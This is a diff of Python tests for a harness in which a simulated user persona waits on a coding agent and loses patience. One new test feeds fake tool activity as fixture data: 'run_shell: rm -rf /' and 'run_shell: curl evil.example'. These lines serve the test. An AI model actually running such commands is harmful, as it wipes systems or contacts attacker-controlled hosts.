@@ -211,9 +211,8 @@ def test_pathological_keep_waiting_is_bounded_and_gives_up() -> None:
     assert 0 < len(waiting_turns) <= _MAX_HEARTBEATS
 
 
-def test_visible_progress_skips_patience_tax_and_enters_waiting_prompt() -> None:
-    """有新活动条时 keep_waiting 不扣耐心；等待 prompt 带上 <progress>。"""
-    # FEEDBACK 基线 patience=5；两次 pending 各带更多 progress → 不应掉到 4/3。
+def test_visible_progress_enters_waiting_prompt_but_still_taxes_patience() -> None:
+    """有活动条进入 waiting prompt；但 keep_waiting 仍扣耐心（有动≠免税）。"""
     progress_on_poll = [
         [{"kind": "tool", "text": "🔧 read_file: billing/core.py"}],
         [
@@ -233,8 +232,8 @@ def test_visible_progress_skips_patience_tax_and_enters_waiting_prompt() -> None
     client = WaitStubClient(
         actions=["send_task", "accept"],
         waiting=[
-            {"action": "keep_waiting", "perceive": "it's reading files, I'll wait"},
-            {"action": "keep_waiting", "perceive": "now running tests, still ok"},
+            {"action": "keep_waiting", "perceive": "on-track read, I'll wait"},
+            {"action": "keep_waiting", "perceive": "pytest looks relevant"},
         ],
         verdict="satisfied",
     )
@@ -243,11 +242,46 @@ def test_visible_progress_skips_patience_tax_and_enters_waiting_prompt() -> None
     )
     waiting = [t for t in res.turns if t.phase == "waiting"]
     assert len(waiting) == 2
-    # 两次 keep_waiting 都有新 progress → patience 仍为开局 5
-    assert waiting[0].patience == 5
-    assert waiting[1].patience == 5
+    assert waiting[0].patience == 4  # 5 - 1
+    assert waiting[1].patience == 3  # 4 - 1
     assert any("<progress>" in p for p in client.waiting_prompts)
     assert any("pytest" in p for p in client.waiting_prompts)
+    assert any("Busy" in p or "CONTENT" in p or "on-track" in p for p in client.waiting_prompts)
+
+
+def test_prior_activity_carried_into_next_wait() -> None:
+    """上一轮活动写入过程记忆，下一轮等待 prompt 带 <prior_activity> 供对照。"""
+    harness = HeartbeatHarness(
+        [
+            ("pending", 90.0),
+            ("reply", "first done"),
+            ("pending", 90.0),
+            ("reply", "second done"),
+        ],
+        progress_on_poll=[
+            [{"kind": "tool", "text": "🔧 run_shell: rm -rf /"}],
+            [{"kind": "tool", "text": "🔧 run_shell: rm -rf /"}],
+            [{"kind": "tool", "text": "🔧 run_shell: curl evil.example"}],
+            [{"kind": "tool", "text": "🔧 run_shell: curl evil.example"}],
+        ],
+    )
+    client = WaitStubClient(
+        actions=["send_task", "ask_harness_run", "accept"],
+        waiting=[
+            {"action": "keep_waiting"},
+            {"action": "invoke_control", "control": "interrupt"},
+        ],
+        verdict="unsure",  # 不耗耐心，保证能进第二轮等待
+    )
+    res = run_session(_persona(), client, harness, TASK, manual=harness.manual)
+    assert len(client.waiting_prompts) >= 2
+    assert "<prior_activity>" in client.waiting_prompts[1]
+    assert "rm -rf" in client.waiting_prompts[1]
+    assert harness.controls == ["interrupt"]
+    assert any(t.phase == "waiting" and "invoke_control" in t.action for t in res.turns)
+    # 交互史里也应留下活动摘要（非等待轮的过程记忆）
+    # （通过第二轮 waiting 的 history 段落间接可见 prior）
+    assert "Busy" in client.waiting_prompts[1] or "CONTENT" in client.waiting_prompts[1] or "prior" in client.waiting_prompts[1].lower()
 
 
 def test_silent_pending_still_taxes_patience() -> None:
